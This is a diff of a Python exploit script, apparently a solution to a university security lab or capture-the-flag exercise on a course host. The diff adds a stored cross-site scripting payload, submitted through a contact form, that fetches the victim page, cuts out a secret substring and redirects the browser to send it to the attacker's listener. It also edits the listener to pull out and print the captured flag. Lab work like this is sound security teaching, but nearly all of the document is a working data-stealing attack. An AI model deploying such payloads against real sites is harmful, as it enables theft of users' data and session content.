@@ -30,7 +30,10 @@ def extract_flag_from_string(string):
 # TODO: modify the handler function appropriately
 class HTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        print(f"Received GET request on path: {self.path}")
+        #print(f"Received GET request on path: {self.path}")
+        clean_path = self.path.replace("%7B", "{").replace("%7D", "}")
+        flag = extract_flag_from_string(clean_path)
+        if(flag): print(flag)
         self.send_response(200)
 
 http_listener = None
@@ -51,12 +54,12 @@ def wait_for_http_request():
     http_listener.handle_request()
 
 listening_url = create_listening_endpoint()
-print(f"Spawned listener on: {listening_url}")
-
+#print(f"Spawned listener on: {listening_url}")
 with requests.Session() as sess:
     # TODO implement exploit
-    sess.post(URL +"/contact", data={"contacttext": f'http://t08-f2584875d6f1e75b.itsec.sec.in.tum.de/help?ln=<script>fetch("{listening_url}")</script>'})
+    sess.post(URL +"/contact", data={"contacttext": f'https://t08-f2584875d6f1e75b.itsec.sec.in.tum.de/help?ln=<script>fetch("https://t08-f2584875d6f1e75b.itsec.sec.in.tum.de/").then((r)=>r.text().then((t)=>window.location="{listening_url}/".concat(t.substring(553, 595))))</script>'})
 
     # Now, our listener will hopefully receive something nice for us!
-    print("Waiting for an incoming request...")
+    #print("Waiting for an incoming request...")
     wait_for_http_request()
+
